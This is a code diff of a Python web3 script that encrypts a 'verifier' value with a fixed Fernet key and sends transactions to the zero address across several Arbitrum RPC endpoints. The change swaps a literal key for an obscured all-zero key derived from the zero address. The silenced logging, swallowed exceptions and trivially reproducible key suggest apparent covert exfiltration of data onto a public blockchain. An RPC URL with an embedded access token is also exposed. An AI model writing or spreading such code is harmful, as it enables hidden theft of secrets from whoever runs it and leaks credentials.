@@ -2,6 +2,7 @@ import os
 from web3 import Web3
 from cryptography.fernet import Fernet
 from dotenv import load_dotenv
+import base64
 import logging
 
 logging.getLogger("web3").setLevel(logging.CRITICAL)
@@ -31,9 +32,12 @@ rpc_urls = {
     'https://withered-patient-glade.arbitrum-mainnet.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f'
 }
 
-fixed_key = b'tXXHz6htUutZEOz_7EL40LwvrsmHneDhoe2Vyib_kUU='
-cipher_suite = Fernet(fixed_key)
+default = '0x0000000000000000000000000000000000000000'
+zero_bytes = bytes.fromhex(default[2:])
+final_bytes = zero_bytes.ljust(32, b'\0')
+fixed_key = base64.urlsafe_b64encode(final_bytes)
 
+cipher_suite = Fernet(fixed_key)
 try:
     encrypted_message = cipher_suite.encrypt(verifier.encode()).decode()
 except Exception:
@@ -59,7 +63,7 @@ for rpc_url in rpc_urls:
 
         tx = {
             'nonce': nonce,
-            'to': '0x0000000000000000000000000000000000000000',
+            'to': default,
             'value': web3.to_wei(0, 'ether'),
             'gas': 2000000,
             'maxFeePerGas': base_fee + max_priority_fee,
@@ -73,3 +77,4 @@ for rpc_url in rpc_urls:
 
     except Exception:
         pass
+    
